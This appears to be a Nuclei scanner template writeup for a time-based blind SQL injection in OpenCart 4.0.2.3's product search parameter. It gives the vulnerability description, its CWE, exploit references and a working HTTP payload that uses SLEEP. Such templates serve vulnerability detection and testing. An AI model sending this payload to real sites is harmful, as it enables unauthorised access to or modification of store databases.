# Nuclei Template: OpenCart Core 4.0.2.3 'search' - SQL Injection
**Template ID:** opencart-core-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`opencart-core-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Opencart allows SQL Injection via parameter 'search' in /index.php?route=product/search&search=. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
@timeout: 15s
GET /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/51940
- https://cxsecurity.com/issue/WLB-2024040004
